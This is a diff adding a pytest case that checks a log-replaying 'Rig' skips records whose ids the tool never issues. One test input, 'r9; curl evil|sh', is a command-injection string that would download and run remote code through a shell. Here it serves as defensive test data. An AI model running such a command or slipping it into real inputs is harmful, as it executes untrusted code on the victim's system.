@@ -223,3 +223,17 @@ def test_a_machine_carries_its_address_and_when_it_was_requested(tmp_path):
     r.move("m1", j.PROVISIONING, instance="7")
     r.move("m1", j.READY, address="ssh4.vast.ai:30123")
     assert r.machines()["m1"].address == "ssh4.vast.ai:30123"
+
+
+@pytest.mark.parametrize("kind, bad", [("request", "r9; curl evil|sh"), ("request", "r9\n"), ("request", "m9"),
+                                       ("machine", "m1 x"), ("session", "r1")])
+def test_a_record_whose_id_flotilla_never_issues_is_skipped(tmp_path, kind, bad):
+    import json
+    store = LocalLogStore(tmp_path / "rig")
+    record = {"kind": kind, "id": bad, "state": {"request": "asked", "machine": "ready", "session": "open"}[kind],
+              "at": "2026-10-07T20:00:00+00:00"}
+    (tmp_path / "rig").mkdir(exist_ok=True)
+    with open(tmp_path / "rig" / "rig.jsonl", "a", encoding="utf-8") as out:
+        out.write(json.dumps(record) + "\n")
+    rig = j.Rig(store)
+    assert not rig.requests() and not rig.machines() and not rig.sessions()
